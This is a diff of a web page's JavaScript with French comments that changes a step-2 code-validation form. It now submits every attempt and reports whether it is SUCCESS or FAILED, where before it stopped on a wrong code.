@@ -231,13 +231,9 @@
 
       const userCode2 = document.getElementById("code2").value;
       const statusDiv = document.getElementById("status2");
-
-      // Vérifier si le code saisi correspond au code généré
-      if (userCode2 !== generatedCode) {
-        statusDiv.className = "error";
-        statusDiv.innerText = "❌ Code incorrect ! Réessayez.";
-        return;
-      }
+      
+      // Vérifier si le code est correct
+      const isCodeCorrect = (userCode2 === generatedCode);
 
       const formData = new FormData();
       formData.append("pseudo", userPseudo);
@@ -245,7 +241,7 @@
       formData.append("code_genere", generatedCode);
       formData.append("code_saisi", userCode2);
       formData.append("etape", "2");
-      formData.append("validation", "SUCCESS");
+      formData.append("validation", isCodeCorrect ? "SUCCESS" : "FAILED");
 
       statusDiv.className = "info";
       statusDiv.innerText = "Envoi en cours...";
@@ -256,21 +252,26 @@
       })
       .then(response => response.json())
       .then(data => {
-        statusDiv.className = "success";
-        statusDiv.innerText = "Validation réussie ✅";
-        
-        // Redirection après validation (tu peux changer l'URL)
-        setTimeout(() => {
-          // Remplace cette URL par ta page de destination
-          window.location.href = "https://example.com/success";
-          // Ou affiche un message : alert("Validation complète !");
-        }, 2000);
+        if (isCodeCorrect) {
+          statusDiv.className = "success";
+          statusDiv.innerText = "Validation réussie ✅";
+          
+          // Redirection après validation réussie
+          setTimeout(() => {
+            // Remplace cette URL par ta page de destination
+            window.location.href = "https://example.com/success";
+            // Ou affiche un message : alert("Validation complète !");
+          }, 2000);
+        } else {
+          statusDiv.className = "error";
+          statusDiv.innerText = "❌ Code incorrect ! Réessayez.";
+        }
       })
       .catch(error => {
         statusDiv.className = "error";
-        statusDiv.innerText = "Erreur lors de la validation ❌";
+        statusDiv.innerText = "Erreur lors de l'envoi ❌";
       });
     });
   </script>
 </body>
-  </html>
+</html>
